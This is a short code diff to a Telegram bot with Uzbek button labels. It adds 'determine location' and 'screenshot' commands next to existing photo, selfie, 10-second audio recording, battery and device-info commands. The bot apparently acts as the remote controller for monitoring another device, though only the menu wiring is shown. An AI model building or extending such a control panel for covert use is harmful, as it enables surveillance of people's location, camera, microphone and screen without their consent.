@@ -42,6 +42,8 @@ def get_main_keyboard():
     kb = [
         [KeyboardButton(text="📸 Rasm olish"), KeyboardButton(text="🤳 Selfie")],
         [KeyboardButton(text="🎙 Ovoz yozish (10 sek)")],
+        [KeyboardButton(text="📍 Manzilni aniqlash")],
+        [KeyboardButton(text="📸 Ekran rasmi")],
         [KeyboardButton(text="🔋 Batareya"), KeyboardButton(text="📱 Qurilma info")],
     ]
     return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
@@ -65,6 +67,8 @@ async def start_handler(message: types.Message):
 @dp.message(F.text.in_({
     "📸 Rasm olish", "🤳 Selfie",
     "🎙 Ovoz yozish (10 sek)",
+    "📍 Manzilni aniqlash",
+    "📸 Ekran rasmi",
     "🔋 Batareya", "📱 Qurilma info"
 }))
 async def action_handler(message: types.Message):
@@ -83,6 +87,8 @@ async def action_handler(message: types.Message):
         "📸 Rasm olish":        "take_photo",
         "🤳 Selfie":            "selfie",
         "🎙 Ovoz yozish (10 sek)": "record_audio",
+        "📍 Manzilni aniqlash":   "get_location",
+        "📸 Ekran rasmi":       "get_screenshot",
         "🔋 Batareya":          "battery",
         "📱 Qurilma info":      "device_info",
     }
